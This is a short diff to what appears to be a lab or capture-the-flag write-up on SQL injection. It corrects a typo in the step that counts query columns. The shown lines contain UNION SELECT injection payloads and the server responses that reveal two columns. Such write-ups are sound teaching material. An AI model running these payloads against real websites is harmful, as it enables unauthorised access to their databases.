@@ -14,7 +14,7 @@
 
 ## Solution:
 - determine number of column
-    ' UNION SELECT 'def',# gives 500 internal server error
+    ' UNION SELECT 'def'# gives 500 internal server error
     ' UNION SELECT 'def','adfs'# gives 200 ok responce
     so there are two column
 
